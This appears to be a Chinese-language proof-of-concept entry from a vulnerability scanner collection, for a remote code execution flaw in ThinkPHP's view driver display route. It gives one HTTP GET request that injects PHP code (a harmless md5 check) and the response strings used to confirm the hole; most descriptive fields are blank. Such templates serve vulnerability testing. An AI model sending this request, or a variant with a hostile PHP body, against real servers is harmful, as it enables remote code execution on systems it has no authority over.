﻿# thinkphp driver display rce

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
GET /index.php?s=index/%5Cthink%5Cview%5Cdriver%5CPhp/display&content=%3C?php%20var_dump(md5(2333));?%3E HTTP/1.1
```

> 响应代码特征：-1

> 响应内容特征：56540676a129760a

> 上传文件定位：

> 验证文件来源：thinkphp_driver_display_rce.poc
